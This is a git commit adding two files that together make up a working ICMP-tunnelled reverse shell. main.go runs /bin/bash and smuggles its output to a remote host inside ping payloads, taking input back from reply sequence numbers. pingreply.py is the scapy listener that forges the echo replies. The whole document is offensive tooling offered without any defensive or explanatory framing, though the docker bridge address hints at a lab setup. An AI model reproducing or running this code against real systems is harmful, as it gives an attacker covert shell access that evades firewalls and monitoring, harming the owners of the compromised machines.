43c577f7daf33a6bc6b6372e7b904825603cdef5
Mark Dietzer <git@doridian.net>
2020-05-30 19:54:35 -0700

    Initial

---
+++ main.go
@@ -0,0 +1,110 @@
+package main
+
+import (
+	"encoding/hex"
+	"fmt"
+	"io"
+	"os/exec"
+	"regexp"
+	"strconv"
+	"sync"
+)
+
+const RHOST = "172.17.0.1"
+const COMMAND = "/bin/bash"
+
+var outQueue []byte
+var outQueueLock sync.Mutex
+
+var icmpSeqRegexp = regexp.MustCompile("icmp_seq=([0-9]+) ttl=")
+
+var subCmd *exec.Cmd
+var subCmdStdin io.WriteCloser
+
+func main() {
+	go sendloop()
+
+	subCmd = exec.Command(COMMAND)
+	subCmd.Start()
+	subCmdStdin, _ = subCmd.StdinPipe()
+
+	stderrPipe, _ := subCmd.StderrPipe()
+	stdoutPipe, _ := subCmd.StdoutPipe()
+
+	go func() {
+		buf := make([]byte, 16)
+		for !subCmd.ProcessState.Exited() {
+			len, _ := stderrPipe.Read(buf)
+			send(buf, len)
+		}
+	}()
+
+	go func() {
+		buf := make([]byte, 16)
+		for !subCmd.ProcessState.Exited() {
+			len, _ := stdoutPipe.Read(buf)
+			send(buf, len)
+		}
+	}()
+
+	subCmd.Wait()
+}
+
+func send(data []byte, len int) {
+	outQueueLock.Lock()
+	outQueue = append(outQueue, data[:len]...)
+	outQueueLock.Unlock()
+}
+
+func recv(data []byte) {
+	subCmdStdin.Write(data)
+}
+
+func sendloop() {
+	for {
+		outQueueLock.Lock()
+		var payloadHex string
+		var payload []byte
+
+		payloadLen := len(outQueue)
+		if payloadLen > 15 {
+			payloadLen = 15
+		}
+		if payloadLen > 0 {
+			payload = outQueue[:payloadLen]
+			outQueue = outQueue[payloadLen:]
+		}
+		outQueueLock.Unlock()
+
+		if payloadLen <= 0 {
+			payloadHex = "00"
+		} else {
+			payloadLenHex := fmt.Sprintf("%02x", payloadLen)
+			payloadHex = payloadLenHex + hex.EncodeToString(payload)
+			for len(payloadHex) < 32 {
+				payloadHex += "00"
+			}
+		}
+
+		cmd := exec.Command("ping", "-W", "1", "-c", "1", "-p", payloadHex, RHOST)
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			if payloadLen > 0 {
+				outQueueLock.Lock()
+				outQueue = append(payload, outQueue...)
+				outQueueLock.Unlock()
+			}
+			continue
+		}
+
+		match := icmpSeqRegexp.FindStringSubmatch(string(out))
+		if match == nil {
+			return
+		}
+
+		num, err := strconv.Atoi(match[1])
+		if err == nil && num > 1000 {
+			recv([]byte{byte(num - 1000)})
+		}
+	}
+}
---
+++ pingreply.py
@@ -0,0 +1,58 @@
+#!/usr/bin/python3
+from scapy.all import *
+from random import randrange
+from sys import stdout, stdin
+
+IFACE = "docker0"
+
+# \xde\xad\xbe\xef\xca\xfe\xba\xbe\xb0\x0b\xfa\xce\xb0\x0c\xab\xcd = max payload length = 16
+# ping -W 1 -c 1 $RHOST -p '0123456789abcdef0123456789abcdef'
+# struct packet {
+#   byte len;
+#   string str;
+# }
+
+to_send = b''
+
+def send_data(data):
+    global to_send
+    to_send += data
+
+def recv_data(data):
+    stdout.write(data)
+    stdout.flush()
+
+# we can reply with bytes in sequence numbers!
+def mk_pong(echoreq):
+    global to_send
+
+    reply_payload = echoreq[3].load
+    pkt = IP(dst=echoreq[1].src,src=echoreq[1].dst)/ICMP(type="echo-reply")/Raw(reply_payload)
+    pkt[1].id = echoreq[2].id
+    pkt[1].seq = echoreq[2].seq
+
+    if len(to_send) > 0:
+        next_byte = to_send[0]
+        to_send = to_send[1:]
+        pkt[1].seq = 1000 + next_byte
+
+
+    hidden_payload_len = reply_payload[16]
+    if hidden_payload_len > 0:
+        print(reply_payload)
+        hidden_payload = reply_payload[17:17+hidden_payload_len]
+        recv_data(hidden_payload)
+
+    return pkt
+
+def resp(pkt, tosend):
+    sendp(Ether(src=pkt[0].dst,dst=pkt[0].src)/tosend, iface=IFACE, verbose=0)
+
+def handle_pkt(pkt):
+    resp(pkt, mk_pong(pkt))
+
+s = AsyncSniffer(filter="icmp && icmp[icmptype] == icmp-echo", prn=handle_pkt, iface=IFACE)
+s.start()
+
+print("Running...")
+
